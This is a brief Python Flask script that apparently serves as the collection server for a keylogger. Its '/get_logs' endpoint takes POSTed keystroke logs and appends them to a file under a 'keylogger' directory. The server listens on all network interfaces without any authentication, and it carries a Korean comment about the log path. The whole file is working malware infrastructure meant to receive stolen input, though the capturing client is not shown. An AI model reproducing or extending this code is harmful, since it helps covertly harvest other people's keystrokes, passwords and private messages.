from flask import Flask, request
import time

app = Flask(__name__)

logs_Path = "C:/Python/keylogger/logs.txt" # 로그파일 경로지정정

@app.route('/get_logs', methods=['POST'])
def get_logs():
    logs = request.form['logs']
    
    with open(logs_Path, 'a') as f:
        f.write(logs + '\n')
        
    return {'result': 'success'}

if __name__ == '__main__':
    app.run(host='0.0.0.0')